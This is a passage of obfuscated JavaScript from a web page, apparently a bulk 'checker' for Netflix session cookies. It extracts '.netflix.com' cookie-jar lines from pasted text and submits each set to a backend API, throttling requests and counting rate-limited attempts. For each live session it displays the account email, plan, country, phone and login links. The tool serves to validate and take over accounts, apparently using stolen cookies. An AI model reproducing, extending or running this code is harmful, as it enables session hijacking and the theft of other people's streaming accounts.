d=JSON.parse(e);if(Array[n(233)](d)){l.push(e[n(247)]()),i=i[n(188)](0,r)+" ".repeat(e[n(165)])+i[n(188)](t+1),s=!0;break}}catch(e){}}s||r++}let e=(i=i[n(205)](/\|/g,"\n"))[n(136)](/\r?\n/),c=[],o=new Set;return e[n(240)](e=>{const t=n;let s=e[t(247)]();s&&";"!==s?(s.endsWith(";")&&(s=s[t(169)](0,-1)[t(247)]()),s.includes(".netflix.com")&&(s[t(252)](t(262))||s.includes(t(213)))?(6<=(e=s.split(/\s+/))[t(165)]&&(e=e[5],o[t(147)](e)&&(l[t(199)](c[t(175)]("\n")),c=[],o[t(217)]()),o.add(e)),c[t(199)](s)):(s[t(252)](t(227))||s.includes(t(187)))&&(0<c[t(165)]&&(l.push(c[t(175)]("\n")),c=[],o.clear()),l[t(199)](s))):0<c[t(165)]&&(l[t(199)](c[t(175)]("\n")),c=[],o[t(217)]())}),0<c.length&&l[n(199)](c[n(175)]("\n")),l}const sleep=t=>new Promise(e=>setTimeout(e,t)),apiUrl=window[m(144)][m(260)];function a(e,t){return e-=134,P()[e]}function createResultElement(r,e,d,c){const o=m;if("SUCCESS"!==r[o(141)])return"bulk"===d?"":r[o(141)]===o(209)&&429===e?o(235)+r[o(246)]+o(245):o(172);{let e=r[o(185)]||o(166),t=r[o(156)]||o(166),s=e[o(252)]("Premium")?o(193):o(148),a=r[o(164)]||"#",i=r[o(192)]||"#",n=r.x_l3||"#",l=d===o(258)?'<div style="background: rgba(255,255,255,0.05); padding: 4px 12px; border-radius: 6px; font-weight: 700; font-size: 11px; letter-spacing: 1px; color: var(--text-muted);">ACCOUNT #'+c+o(248):o(259);return o(190)+l+o(134)+(r.x_mail||o(189))+o(171)+s+';">'+e+'</div>\n                        </div>\n                        <div class="col-6 text-right">\n                            <div class="field-label">COUNTRY</div>\n                            <div class="field-value">'+t+'</div>\n                        </div>\n                    </div>\n\n                    <div class="row mb-4">\n                        <div class="col-6">\n                            <div class="field-label">PHONE</div>\n                            <div class="field-value">'+(r[o(149)]||"N/A")+o(184)+(r[o(210)]||o(254))+o(143)+(r[o(223)]||o(254))+o(229)+(r[o(239)]||o(254))+o(220)+(r[o(257)]||o(254))+'</div>\n                    </div>\n\n                    <div class="action-pill-group">\n                        <a href="'+a+o(256)+i+o(158)+n+o(261)}}async function processSingle(){const t=m,e=$(t(198))[t(204)]().trim();if(!e)return alert(t(178));const s=parseMixedInput(e),a=0<s.length?s[0]:e,i=$(t(160)),n=i[t(183)]();i[t(153)](t(173),!0)[t(183)](t(251)),$(t(215)).show(),$("#resultsHeader")[t(228)]("d-flex").hide(),$("#bulkStats")[t(228)](t(145))[t(151)](),$(t(250))[t(163)](),$(t(155)).hide(),$(t(250))[t(183)]('\n            <div class="text-center py-5 fade-in">\n                <div class="loader" style="width: 40px; height: 40px; border-width: 4px; border-top-color: #f43f5e;"></div>\n                <div class="mt-3" style="color: var(--text-muted); font-size: 14px; font-weight: 600; letter-spacing: 1px; text-transform: uppercase;">Authenticating...</div>\n            </div>\n        ');try{const r=await fetch(apiUrl,{method:t(230),headers:{"Content-Type":t(168)},body:JSON[t(142)]({cookie:a})}),d=await r[t(157)]();var l=createResultElement(JSON.parse(d),r[t(141)],t(138),1);$(t(250)).html(l),$(t(198))[t(204)]("")}catch(e){$(t(250)).html(t(242))}finally{i[t(153)](t(173),!1).html(n)}}async function processBulk(){const t=m,e=$(t(194)).val().trim();if(!e)return alert(t(214));var s=parseMixedInput(e);if(0===s[t(165)])return alert(t(225));const a=$(t(180));a.prop("disabled",!0)[t(183)](t(177)),$(t(215)).show(),$(t(216))[t(159)](t(145))[t(163)](),$(t(186)).addClass(t(145))[t(163)](),$("#singleResultsList")[t(151)](),$(t(207))[t(219)](),currentActiveIndex=0,totalActiveCards=0,updateCarouselUI();let i=0,n=0;$(t(150))[t(157)](totalActiveCards),$(t(170))[t(157)](i),$(t(203))[t(157)](n),$(t(218))[t(183)](t(226));for(let e=0;e<s[t(165)];e++){try{const c=await fetch(apiUrl,{method:t(230),headers:{"Content-Type":t(168)},body:JSON.stringify({cookie:s[e]})}),o=await c[t(157)]();var l,r,d=JSON[t(191)](o);d[t(141)]===t(221)?(totalActiveCards++,$(t(150))[t(157)](totalActiveCards),l=1===totalActiveCards?t(201):"",r=createResultElement(d,c[t(141)],t(258),totalActiveCards),$("#bulkResultsList")[t(224)](t(174)+l+'">'+r+t(248)),updateCarouselUI()):"ERROR"===d[t(141)]&&429===c.status?(n++,$(t(203))[t(157)](n)):(i++,$(t(170))[t(157)](i))}catch(e){i++,$(t(170))[t(157)](i)}e<s.length-1&&await sleep(2e3)}$("#progressText")[t(183)](t(234)+s[t(165)]+t(255)),a[t(153)]("disabled",!1)[t(183)](t(182)),$("#bulkInput")[t(204)]("")}</script>
+</script>
+
+</body>
+</html>
